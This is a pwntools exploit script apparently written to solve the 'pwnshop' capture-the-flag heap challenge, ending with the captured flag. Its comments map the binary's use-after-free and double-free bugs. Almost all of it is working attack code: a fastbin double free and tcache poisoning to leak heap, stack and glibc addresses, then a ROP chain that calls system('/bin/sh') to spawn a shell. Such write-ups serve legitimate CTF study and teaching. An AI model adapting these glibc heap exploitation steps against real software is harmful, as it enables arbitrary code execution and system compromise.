from pwn import *
# from subprocess import getoutput

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    continue
''')

# p = remote('pwnshop.challs.m0lecon.it', 33863)

# p.recvuntil(b"or\n")
# cmd = p.recvline().strip().decode()
# p.sendlineafter(b"Result: ", getoutput(cmd).encode())

# sell item by item_name (28 bytes at most starting from address of corresponding chunk) and price (dword in address of corresponding chunk + 0x30), deal can be made or not
# malloc a chunk of size 0x50 and store item_name starting from chunk address and price to chunk address + 0x30; chunk will be freed immediately if first byte of item_name is "\n" or "\x00", or any error occurs in fgets or scanf
# if price is provided less than or equal to 0x3e8, deal can be chosen to be made or not
# if price is provided greater than 0x3e8, item_name will be splited into separate parts by " " and all " " will be replaced with "\x00"; chunk will be freed immediately if number of separate parts is less than or equal to 2; otherwise, qword in chunk address + 0x38, aka item_id, will be set as a random value and deal can be chosen to be made or not
# if deal is chosen to be made, store stack address of username to chunk address + 0x28 and record chunk pointer in item list at first available item_code (index from 0 to 0x10)
# if deal is chosen to be not made, no further actions will be taken
def sell_item(item_name, price, deal):
    p.sendlineafter(b"Your choice: ", b'1')
    if len(item_name) == 0x27:
        p.sendafter(b"What have you got? ", item_name)
    else:
        p.sendlineafter(b"What have you got? ", item_name)
    p.sendlineafter(b"How much do you want for it? ", str(price).encode())
    if price > 0x3e8 and len(item_name.split(b' ')) <= 2:
        return
    if deal:
        p.sendlineafter(b"Do we have a deal? (y/n) ", b'y')
    else:
        p.sendlineafter(b"Do we have a deal? (y/n) ", b'n')

# buy item by item_code (index of valid corresponding chunk from 0 to 0x10) and price (dword in address of corresponding chunk + 0x30)
# if first byte of item_name at item_code is not "\x00" and price is provided at least twice as much, item's corresponding chunk will be freed and its pointer will be set to null
# if first byte of item_name at item_code is "\x00", item's corresponding chunk will be freed with no further actions
def buy_item(item_code, price):
    p.sendlineafter(b"Your choice: ", b'2')
    p.sendlineafter(b"What would you like to buy? ", str(item_code).encode())
    if price:
        p.sendlineafter(b"What's the best you can do for it? ", str(price).encode())

# print out all items' "Code" and "Item ID"
# "Code", aka item_name, is printed as a string starting from address of corresponding chunk
# "Item ID", aka item_id, is printed as an 8-byte string at most starting from address of corresponding chunk + 0x38
def list_items():
    p.sendlineafter(b"Your choice: ", b'4')

# exit program by returning from main
def goodbye():
    p.sendlineafter(b"Your choice: ", b'5')

# structure of item is like 0x00: item_name, 0x28: username, 0x30: price, 0x38: item_id
# item list on stack records chunk pointers of items with item_code as index from 0 to 0x10

# situations that a chunk is malloced with pointer recorded and able to be freed:
# 1. sell item with price less than or equal to 0x3e8 and choose to make deal
# 2. sell item with price greater than 0x3e8, item_name separable by " " into more than 2 parts (" " zeroed and item_id overwritten), and choose to make deal

# situations that a chunk is malloced without pointer recorded and unable to be freed:
# 1. sell item with price less than or equal to 0x3e8 and choose not to make deal
# 2. sell item with price greater than 0x3e8, item_name separable by " " into more than 2 parts (" " zeroed and item_id overwritten), and choose not to make deal

# situations that a chunk is malloced and freed immediately without pointer recorded:
# 1. sell item with item_name whose first byte is "\x00"
# 2. sell item with price greater than 0x3e8, item_name separable by " " into less than or equal to 2 parts

# situations that a chunk is freed with pointer nulled:
# 1. buy item with price provided at least twice as much, whose item_name's first byte is not "\x00"

# situations that a chunk is freed with pointer not nulled (available for use-after-free: leak or double free into fastbin):
# 1. buy item with price provided at least twice as much, whose item_name's first byte is "\x00"

glibc_e = ELF('./libc.so.6')

# Stage 1: leak heap base address commonly and fastbin reverse into tcache followed by tcache poisoning to heap for leak of main return address
sell_item(b' A A A A', 0x400, True) # heap_base_addr+0x4f0, index 0, malloced and able to be freed twice
sell_item(b' A A A A', 0x400, True) # heap_base_addr+0x540, index 1, malloced and able to be freed twice
for _ in range(2, 9):
    sell_item(b'A', 0x40, True) # index 2 to 8, malloced and able to be freed once
for i in range(2, 9):
    buy_item(10-i, 0x80) # index 9 to 2, freed and pointer nulled
# now tcache bin of size 0x50 is filled with 7 chunks
buy_item(0, None) # heap_base_addr+0x4f0, index 0, freed and pointer not nulled
buy_item(1, None) # heap_base_addr+0x540, index 1, freed and pointer not nulled
# leak heap base address (within chunk at index 0, qword in heap_base_addr+0x4f0 is set to 0^((heap_base_addr)>>12) after chunk at index 0 is freed)
list_items()
p.recvuntil(b"Code 0: ")
heap_base_addr = u64(p.recvline().strip().ljust(8, b'\x00'))<<12
log.info(f"heap base address: {hex(heap_base_addr)}")
buy_item(0, 0x800) # heap_base_addr+0x4f0, index 0, freed and pointer nulled
# now fastbin of size 0x50 contains duplicate chunks: heap_base_addr+0x4f0 -> heap_base_addr+0x540 -> heap_base_addr+0x4f0
sell_item(b'A'*0x10+p64(0^((heap_base_addr)>>12)), 0x40, True) # heap_base_addr+0x590, index 0, malloced and able to be freed once
# now qword in heap_base_addr+0x5a0 is 0^((heap_base_addr)>>12), which will ensure that tcache bin of size 0x50 has a valid end after next tcache poisoning
for i in range(3, 9):
    sell_item(b'A', 0x40, False) # pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is cleared
# trigger fastbin reverse into tcache and tcache poisoning
sell_item(p64((heap_base_addr+0x5a0)^((heap_base_addr+0x4f0)>>12)), 0x40, False) # heap_base_addr+0x4f0, pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is poisoned: heap_base_addr+0x540 -> heap_base_addr+0x4f0 -> heap_base_addr+0x5a0
sell_item(b' A A A A', 0x400, False) # heap_base_addr+0x540, pointer not recorded, but already in index 1, keep it double-freeable
sell_item(b' A A A A', 0x400, True) # heap_base_addr+0x4f0, index 2, malloced and able to be freed twice
sell_item(b'A', 0x40, True) # heap_base_addr+0x5a0, index 3, malloced and able to be freed once
# leak main return address (within chunk at index 0, qword in heap_base_addr+0x590+0x38/heap_base_addr+0x5a0+0x28 is set to a stack address after chunk at index 3 is malloced)
list_items()
p.recvuntil(b"Item ID: ")
main_return_addr = u64(p.recvline().strip().ljust(8, b'\x00'))+0x30
log.info(f"main return address: {hex(main_return_addr)}")

# Stage 2: three times of fastbin reverse into tcache followed by tcache poisoning to heap for leak of glibc base address
for _ in range(4, 11):
    sell_item(b'A', 0x40, True) # index 4 to 10, malloced and able to be freed once
for i in range(4, 11):
    buy_item(14-i, 0x80) # index 10 to 4, freed and pointer nulled
# now tcache bin of size 0x50 is filled with 7 chunks
buy_item(2, None) # heap_base_addr+0x4f0, index 2, freed and pointer not nulled
buy_item(1, None) # heap_base_addr+0x540, index 1, freed and pointer not nulled
buy_item(2, 0x800) # heap_base_addr+0x4f0, index 2, freed and pointer nulled
# now fastbin of size 0x50 contains duplicate chunks: heap_base_addr+0x4f0 -> heap_base_addr+0x540 -> heap_base_addr+0x4f0
for i in range(4, 11):
    sell_item(b'A', 0x40, False) # pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is cleared
# qword in heap_base_addr+0x310 is already 0^((heap_base_addr)>>12), which will ensure that tcache bin of size 0x50 has a valid end after next tcache poisoning
# trigger fastbin reverse into tcache and tcache poisoning
sell_item(p64((heap_base_addr+0x310)^((heap_base_addr+0x4f0)>>12)), 0x40, False) # heap_base_addr+0x4f0, pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is poisoned: heap_base_addr+0x540 -> heap_base_addr+0x4f0 -> heap_base_addr+0x310
sell_item(b' A A A A', 0x400, False) # heap_base_addr+0x540, pointer not recorded, but already in index 1, keep it double-freeable
sell_item(b' A A A A', 0x400, True) # heap_base_addr+0x4f0, index 2, malloced and able to be freed twice
sell_item(b'A'*0x10+p64((heap_base_addr)>>12), 0x40, False) # heap_base_addr+0x310, pointer not recorded, malloced and unable to be freed
# now qword in heap_base_addr+0x320 is 0^((heap_base_addr)>>12), which will ensure that tcache bin of size 0x50 has a valid end after next tcache poisoning
for _ in range(4, 11):
    sell_item(b'A', 0x40, True) # index 4 to 10, malloced and able to be freed once
for i in range(4, 11):
    buy_item(14-i, 0x80) # index 10 to 4, freed and pointer nulled
# now tcache bin of size 0x50 is filled with 7 chunks
buy_item(2, None) # heap_base_addr+0x4f0, index 2, freed and pointer not nulled
buy_item(1, None) # heap_base_addr+0x540, index 1, freed and pointer not nulled
buy_item(2, 0x800) # heap_base_addr+0x4f0, index 2, freed and pointer nulled
# now fastbin of size 0x50 contains duplicate chunks: heap_base_addr+0x4f0 -> heap_base_addr+0x540 -> heap_base_addr+0x4f0
for i in range(4, 11):
    sell_item(b'A', 0x40, False)  # pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is cleared
# trigger fastbin reverse into tcache and tcache poisoning
sell_item(p64((heap_base_addr+0x320)^((heap_base_addr+0x4f0)>>12)), 0x40, False) # heap_base_addr+0x4f0, pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is poisoned: heap_base_addr+0x540 -> heap_base_addr+0x4f0 -> heap_base_addr+0x320
sell_item(b' A A A A', 0x400, False) # heap_base_addr+0x540, pointer not recorded, but already in index 1, keep it double-freeable
sell_item(b' A A A A', 0x400, True) # heap_base_addr+0x4f0, index 2, malloced and able to be freed twice
sell_item(b'A'*0x20+p64((heap_base_addr)>>12)[:-1], 0x40, False) # heap_base_addr+0x320, pointer not recorded, malloced and unable to be freed
# now qword in heap_base_addr+0x340 is 0^((heap_base_addr)>>12), which will ensure that tcache bin of size 0x50 has a valid end after next tcache poisoning
for _ in range(4, 11):
    sell_item(b'A', 0x40, True) # index 4 to 10, malloced and able to be freed once
for i in range(4, 11):
    buy_item(14-i, 0x80) # index 10 to 4, freed and pointer nulled
# now tcache bin of size 0x50 is filled with 7 chunks
buy_item(2, None) # heap_base_addr+0x4f0, index 2, freed and pointer not nulled
buy_item(1, None) # heap_base_addr+0x540, index 1, freed and pointer not nulled
buy_item(2, 0x800) # heap_base_addr+0x4f0, index 2, freed and pointer nulled
# now fastbin of size 0x50 contains duplicate chunks: heap_base_addr+0x4f0 -> heap_base_addr+0x540 -> heap_base_addr+0x4f0
for i in range(4, 11):
    sell_item(b'A', 0x40, False) # pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is cleared
# trigger fastbin reverse into tcache and tcache poisoning
sell_item(p64((heap_base_addr+0x340)^((heap_base_addr+0x4f0)>>12)), 0x40, False) # heap_base_addr+0x4f0, pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is poisoned: heap_base_addr+0x540 -> heap_base_addr+0x4f0 -> heap_base_addr+0x340
sell_item(b' A A A A', 0x400, False) # heap_base_addr+0x540, pointer not recorded, but already in index 1, keep it double-freeable
sell_item(b' A A A A', 0x400, True) # heap_base_addr+0x4f0, index 2, malloced and able to be freed twice
sell_item(b'A', 0x40, True) # heap_base_addr+0x340, index 4, malloced and able to be freed once
# leak glibc base address (within chunk at index 4, qword in heap_base_addr+0x340+0x38 is already a glibc address)
list_items()
p.recvuntil(b"Code 4: A\n\nItem ID: ")
glibc_base_addr = u64(p.recvline().strip().ljust(8, b'\x00'))-glibc_e.symbols['_IO_2_1_stderr_']
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 3: fastbin reverse into tcache followed by tcache poisoning to stack for ROP
for _ in range(5, 12):
    sell_item(b'A', 0x40, True) # index 5 to 11, malloced and able to be freed once
for i in range(5, 12):
    buy_item(16-i, 0x80) # index 11 to 5, freed and pointer nulled
# now tcache bin of size 0x50 is filled with 7 chunks
buy_item(2, None) # heap_base_addr+0x4f0, index 2, freed and pointer not nulled
buy_item(1, None) # heap_base_addr+0x540, index 1, freed and pointer not nulled
buy_item(2, 0x800) # heap_base_addr+0x4f0, index 2, freed and pointer nulled
# now fastbin of size 0x50 contains duplicate chunks: heap_base_addr+0x4f0 -> heap_base_addr+0x540 -> heap_base_addr+0x4f0
for i in range(5, 12):
    sell_item(b'A', 0x40, False) # pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is cleared
# trigger fastbin reverse into tcache and tcache poisoning
sell_item(p64((main_return_addr)^((heap_base_addr+0x4f0)>>12)), 0x40, False) # heap_base_addr+0x4f0, pointer not recorded, malloced and unable to be freed
# now tcache bin of size 0x50 is poisoned: heap_base_addr+0x540 -> heap_base_addr+0x4f0 -> main_return_addr
sell_item(b' A A A A', 0x400, False) # heap_base_addr+0x540, pointer not recorded, but already in index 1, keep it double-freeable
sell_item(b' A A A A', 0x400, True) # heap_base_addr+0x4f0, index 2, malloced and able to be freed twice
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
sell_item(b'A'*0x8+b''.join([p64(c) for c in chain])[:-1], 0x40, False) # main_return_addr, pointer not recorded, malloced and unable to be freed
# trigger ROP by returning from main
goodbye()

p.interactive()

# echo $FLAG
# ptm{1_d0nt_kn0w_f4k3_1t_l00k5_r1ck}